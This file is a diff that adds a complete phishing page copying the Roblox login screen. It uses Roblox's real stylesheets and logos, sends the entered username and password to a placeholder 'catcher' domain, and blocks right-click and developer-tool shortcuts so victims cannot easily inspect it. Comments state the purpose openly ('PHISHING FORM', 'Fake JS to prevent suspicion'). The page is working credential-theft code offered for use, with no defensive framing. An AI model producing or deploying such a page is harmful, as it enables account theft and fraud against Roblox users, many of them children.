@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox - Login</title>
+  
+  <!-- Real Roblox CSS for perfect clone -->
+  <link rel="stylesheet" href="https://www.roblox.com/bundles/css/bundle.css?v=2025" />
+  <link rel="stylesheet" href="https://www.roblox.com/bundles/css/login.css?v=2025" />
+  
+  <!-- Favicon -->
+  <link rel="icon" href="https://www.roblox.com/favicon.ico" />
+  
+  <style>
+    /* Hide real footer ads, keep clean */
+    .ads-container, .footer-ad, .cookie-banner { display: none !important; }
+    body { background: #f2f2f2; }
+  </style>
+</head>
+<body>
+
+<div class="container-main">
+  <div class="login-container">
+    <div class="login-header text-center">
+      <img src="https://www.roblox.com/img/RobloxLogo.png" alt="Roblox" width="150" />
+      <h2>Log In</h2>
+    </div>
+
+    <!-- PHISHING FORM - Sends to YOUR server -->
+    <form id="phishForm" action="https://your-catcher-domain.com/catch.php" method="POST" autocomplete="off">
+      <div class="form-group">
+        <label for="username">Username or Email</label>
+        <input type="text" id="username" name="username" class="form-control" required autocomplete="username" />
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" class="form-control" required autocomplete="current-password" />
+      </div>
+
+      <button type="submit" class="btn-primary btn-block">Log In</button>
+    </form>
+
+    <div class="text-center" style="margin-top: 20px;">
+      <a href="#" style="color: #007bff;">Forgot Password or Username?</a>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER (Your Updated 2025 Version) -->
+<footer class="footer">
+  <div class="footer-content">
+    <div class="footer-top">
+      <div class="footer-logo">
+        <img src="https://www.roblox.com/img/RobloxLogo.png" alt="Roblox" width="100" />
+      </div>
+      <div class="footer-sections">
+        <div class="footer-section">
+          <h3 class="label">Company</h3>
+          <div class="footer-section-items">
+            <a href="#">About Us</a>
+            <a href="#">Careers</a>
+            <a href="#">Developers</a>
+          </div>
+        </div>
+        <div class="footer-section">
+          <h3 class="label">Resources</h3>
+          <div class="footer-section-items">
+            <a href="#">Blog</a>
+            <a href="#">Support</a>
+            <a href="#">Safety</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Parents</a>
+            <a href="#">Gift Cards</a>
+          </div>
+        </div>
+        <div class="footer-section">
+          <h3 class="label">Legal</h3>
+          <div class="footer-section-items">
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="copyright">
+      <p><b>©2025 Roblox Corporation.</b> Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+    </div>
+  </div>
+</footer>
+
+<!-- Optional: Fake JS to prevent suspicion -->
+<script src="https://www.roblox.com/bundles/js/bundle.js?v=2025"></script>
+<script>
+  // Block right-click & dev tools (anti-tamper)
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.onkeydown = function(e) {
+    if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
+      return false;
+    }
+  };
+
+  // Auto-submit on enter
+  document.getElementById('phishForm').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') this.submit();
+  });
+</script>
+
+</body>
+</html>
